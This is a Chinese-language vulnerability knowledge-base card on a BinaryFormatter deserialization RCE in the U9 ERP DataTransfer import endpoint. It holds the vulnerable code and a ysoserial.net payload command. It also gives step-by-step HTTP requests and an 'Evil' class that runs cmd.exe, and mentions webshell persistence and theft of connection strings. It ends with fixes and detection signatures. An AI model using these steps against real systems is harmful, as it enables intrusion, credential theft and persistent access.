---
id: web-dotnet-deser-u9-datatransfer-binaryformatter-rce
title: U9 ERP DataTransfer 导入包无 Binder 的 BinaryFormatter 反序列化 RCE
type: scenario
domain: web
path: web/dotnet/deserialization
technique: u9-datatransfer-binaryformatter-no-binder-deserialization
tags:
- dotnet
- binaryformatter
- deserialization
- rce
- erp
- ysoserial
- textformattingrunproperties
- iis
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V24
  verified_at: '2026-11-05T02:56:26+08:00'
  notes: 已对照原文全文与3张图核对：IoPackage.DecompressPackage 先 SharpZipLib 解 ZIP 再 BinaryFormatter.Deserialize 且未设 Binder、TextFormattingRunProperties→ObjectDataProvider→Process.Start、Upload→ImportPackage 两步触达、cast 在反序列化后发生、whoami 回显 iis apppool\u9 apppool clr4（图03）均一致；原文'影响版本'为 ***，未设 affected_versions 正确。PoC 未在本机执行。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-u9-datatransfer-binaryformatter-rce/
draft: false
kb_aliases:
- U9 数据迁移反序列化
- UFSoft.UBF.MVC IoPackage 反序列化
- DataTransfer ImportPackage RCE
- 用友 U9 BinaryFormatter 漏洞
- 门户侧数据迁移接口 RCE
---

## 一句话结论

U9 云 ERP 门户侧的数据迁移接口在导入 `.bin` 包时，把 SharpZipLib 解压出的字节流直接交给未设置 `SerializationBinder` 的 `BinaryFormatter.Deserialize()`；持有数据迁移权限（`ea`）的会话上传一个“ZIP 包裹的 ysoserial gadget”，即可在反序列化阶段以 IIS 应用池身份执行任意命令。

## 原理

- 入口与根因位于 `UFSoft.UBF.MVC.dll` 的 `IoPackage.DecompressPackage(byte[])`：
  ```csharp
  static IoPackage DecompressPackage(byte[] bytes)
  {
      BinaryFormatter formatter = new BinaryFormatter();   // 未设置 Binder
      byte[] decompressed = Decompress(bytes);             // SharpZipLib 解 ZIP
      MemoryStream stream = new MemoryStream(decompressed);
      return (IoPackage)formatter.Deserialize(stream);     // 无类型白名单
  }
  ```
- `BinaryFormatter` 按序列化流中记录的“程序集 + 类型全名”加载并实例化类型，`SerializationBinder` 是唯一能把“类型名 → Type”的解析拦下来的钩子；不设置 Binder 等价于允许加载任意可被找到的类型。
- 攻击链把“类型实例化”转成“命令执行”依赖 gadget。原文使用 `TextFormattingRunProperties`：其反序列化回调触发 WPF `ObjectDataProvider`，后者以 `ObjectType=System.Diagnostics.Process`、`MethodName=Start`、`MethodParameters=["cmd","/c <命令>"]` 通过反射调用 `Process.Start`。因此攻击者不需要目标预置任何自定义类型。
- 数据流形态：
  ```text
  evil.bin = ZIP(单 entry) 包裹 BinaryFormatter 流
  BinaryFormatter 流 = TextFormattingRunProperties → ObjectDataProvider → Process.Start
  ```
- `(IoPackage)Deserialize(...)` 的强制转换发生在反序列化之后，gadget 代码在转换前已执行；攻击者看到的 `InvalidCastException`/HTML 错误页恰恰说明反序列化已发生、RCE 已触发。
- 为什么是“漏网”入口：同一产品此前修复过 `CommandService` 的同型缺陷，但门户侧 DataTransfer 的这个入口未同步修复。

## 触发条件

- 目标为使用 U9 门户（`/U9C` 等）且部署了 `.NET Framework 4.x` / IIS 的实例，`/mvc/DataTransfer/` 功能可达。
- 攻击者拥有 `ea` 管理员会话（或通过其他缺陷取得），因为 `Upload`/`ImportPackage` 需要“数据迁移”权限。
- 目标已存在或攻击者可创建 `DataManagerProject`（`ImportPackage` 需要 `DataManagerProjectId`）。
- 服务进程可加载对应 gadget 依赖（WPF/`PresentationFramework`；`.NET Framework` Web 应用通常具备）。

## 利用步骤

1. 用 ysoserial.net 生成 BinaryFormatter 原始载荷：
   ```text
   ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -c "cmd /c whoami > C:\temp\pwned.txt" -o raw > payload.raw
   ```
2. 用 SharpZipLib 按 `IoPackage` 期望格式把载荷打成单 entry 的 `.bin`（entry 名任意，原文为 `a.bin`）。
3. 以 `ea` 会话登录，调用 `DataTransfer/GetDataManagerProject` 取项目 ID，没有则用 `DataTransfer/AddDataManagerProject` 创建一个。
4. `POST /mvc/DataTransfer/Upload`（multipart，`file=evil.bin`）拿到 `PackageUploadId`。
5. `POST /mvc/DataTransfer/ImportPackage`（`PackageUploadId` + `DataManagerProjectId`）触发解压与反序列化，命令以 `iis apppool\<应用池> clr4` 身份执行。
6. 验证：读取命令回显文件；原文进一步用 `type web.config` 取数据库明文连接串，并在可写 Web 根落 `cmd.aspx` WebShell 做持久化。

## PoC

最小请求形态：

```http
POST /U9C/mvc/DataTransfer/Upload HTTP/1.1
Host: target
Cookie: <ea 会话>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="evil.bin"
Content-Type: application/octet-stream

<ZIP 包裹的 BinaryFormatter gadget>
------X--
```

```http
POST /U9C/mvc/DataTransfer/ImportPackage HTTP/1.1
Host: target
Cookie: <ea 会话>
Content-Type: application/x-www-form-urlencoded

PackageUploadId=<上传返回的 ID>&DataManagerProjectId=<项目 GUID>
```

```text
# 预期：返回 HTML 错误页 / InvalidCastException（cast 前已执行 gadget）
# 目标机器 C:\temp\pwned.txt 内容为 iis apppool\<应用池> clr4
```

载荷构造：
```text
ysoserial -f BinaryFormatter -g TextFormattingRunProperties -c "cmd /c <命令>" -o raw
  → 用 SharpZipLib ZipOutputStream 写入单 entry → evil.bin
```

反序列化回调即执行点（原理自证类型，用于本地说明）：
```csharp
[Serializable]
public class Evil : ISerializable
{
    protected Evil(SerializationInfo info, StreamingContext context)
    {
        System.Diagnostics.Process.Start("cmd.exe", "/c whoami > C:\\temp\\poc_pwned.txt");
    }
    public void GetObjectData(SerializationInfo info, StreamingContext context) { }
}
```

## 变体与关联

- 变体：gadget 可替换为 ysoserial.net 的其他 BinaryFormatter 链（如 `TypeConfuseDelegate`、`WindowsIdentity` 等），取决于目标已加载的框架程序集；`TextFormattingRunProperties` 只要求 WPF，通用性较好。
- 变体：其它把客户端包/文件解压后送入 `BinaryFormatter` 的导入/迁移/备份/恢复接口属于同一模式，可复用本卡思路排查。
- 关联：[[web-dotnet-deser-erp-openserverdialog-binaryformatter-rce]]（另一国产 ERP 的 BinaryFormatter + 任意类实例化 + SSRF 链）；[[web-dotnet-deser-servicehandler-typenamehandling]]、Telerik CVE-2019-18935 卡（同为 .NET 反序列化入口）。
- 边界：本入口需 `ea` 管理员权限（PR:H）；若 `ea` 会话本身可由低权限缺陷获取，CVSS 可升至 8.8。
- 关联：反序列化成功后 Web 根可写、web.config 明文连接串可读，是从 RCE 走向持久化与横向的常见后利用面。

## 检测与防御

- 根治：删除 `IoPackage.DecompressPackage` 中的 `BinaryFormatter.Deserialize`，改用显式 DTO + JSON/DataContract 反序列化；若必须保留，设置严格的 `SerializationBinder` 白名单，并禁用 `AssemblyFormat=Simple`。
- 根治：`BinaryFormatter` 在 .NET Framework 中可通过 `AppContext` 开关禁用（`Switch.System.Runtime.Serialization.UseNewMaxArraySize` 等控制项之外，最直接是移除调用点）；新代码不应使用。
- 修复：`DataTransfer/Upload` 增加文件类型/大小/内容校验与权限最小化；`ImportPackage` 导入前校验包格式与来源，限制可导入的 entry 数量与解压大小（防 zip bomb，非本卡主线）。
- 加固：数据迁移功能仅对可信管理员开放并加二次认证；Web 根目录不可写、连接串加密存储；IIS 应用池使用最低权限账户。
- 检测：`/mvc/DataTransfer/ImportPackage` 与紧随其后的 `Upload` 成对出现；上传文件扩展名 `.bin` 且内容为 ZIP + BinaryFormatter 魔数 `00 01 00 00 00 FF FF FF FF`；w3wp 子进程异常启动 `cmd.exe`；`C:\temp` 下出现命令回显文件；`cmd.aspx` 等异常脚本文件落地。
- 检测：IIS 日志中同一 `ea` 会话短时间“建项目 → 上传 → 导入”的异常序列。
